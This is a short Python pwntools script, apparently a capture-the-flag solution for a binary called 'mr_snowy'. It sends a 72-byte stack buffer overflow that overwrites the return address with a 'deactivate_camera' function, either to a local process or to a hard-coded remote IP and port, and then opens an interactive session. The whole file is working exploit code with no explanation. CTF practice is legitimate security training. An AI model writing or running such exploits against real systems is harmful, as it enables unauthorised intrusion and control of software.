from pwn import *
import sys

elf = ELF('./mr_snowy')
func = elf.symbols['deactivate_camera']
offset = 72

payload = b'A' * offset
payload += p64(func)

if args.LOCAL:
	p = elf.process()
else:
	host = '206.189.24.71'
	port = 30804
	p = remote(host, port)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', payload)

p.interactive()

p.close()